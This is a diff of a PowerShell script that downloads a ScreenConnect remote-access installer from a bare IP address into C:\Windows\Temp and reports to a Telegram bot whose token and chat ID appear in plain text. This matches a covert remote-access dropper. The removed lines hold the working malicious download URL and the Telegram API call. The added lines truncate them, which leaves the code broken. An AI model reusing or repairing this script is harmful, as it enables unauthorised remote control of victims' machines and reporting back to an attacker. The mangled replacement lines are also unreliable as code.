@@ -12,7 +12,7 @@ $BotToken = "8804791627:AAG1vTmc-HlAW8DR0gzKezeKidm4W3DwmXY"
 $ChatID   = "6867549905"
 
 # 2. APPLICATION CONFIGURATION - PASTE ANY MSI LINK HERE
-$MsiUrl    = "http://50.114.179.239/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
+$MsiUrl    = "http://50.114.179"
 $TempDir   = "C:\Windows\Temp"
 
 # --- NATIVE URI FILENAME EXTRACTION (No String Splitting) ---
@@ -20,7 +20,7 @@ $UriObject   = [System.Uri]$MsiUrl
 $FileName    = [System.IO.Path]::GetFileName($UriObject.AbsolutePath)
 $BaseName    = [System.IO.Path]::GetFileNameWithoutExtension($UriObject.AbsolutePath)
 
-# Isolate the primary name (e.g., extracts "ScreenConnect" instead of "ScreenConnect.ClientSetup")
+# FIXED: Extracts ONLY the first clean string ("ScreenConnect") to prevent array crashes
 $AppName     = $BaseName.Split('.')[0]
 
 # Fallback validation if the URL structure doesn't expose a clear .msi name
@@ -45,7 +45,7 @@ function Send-TelegramAlert {
             text    = $Message
         } | ConvertTo-Json -Compress -Depth 2
 
-        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" `
+        Invoke-RestMethod -Uri "https://telegram.org" `
                           -Method Post `
                           -ContentType "application/json; charset=utf-8" `
                           -Body $Payload -ErrorAction Stop | Out-Null
@@ -82,7 +82,7 @@ try {
     Write-Output "Downloading $AppName MSI..."
     if (Test-Path $MsiPath) { Remove-Item $MsiPath -Force -ErrorAction SilentlyContinue }
 
-    # Downloads using your raw unedited $MsiUrl string variable directly
+    # Downloads using your raw unedited $MsiUrl string directly
     Invoke-WebRequest -Uri $MsiUrl -OutFile $MsiPath -UseBasicParsing -ErrorAction Stop
 
     if (-not (Test-Path $MsiPath) -or (Get-Item $MsiPath).Length -lt 1024) {
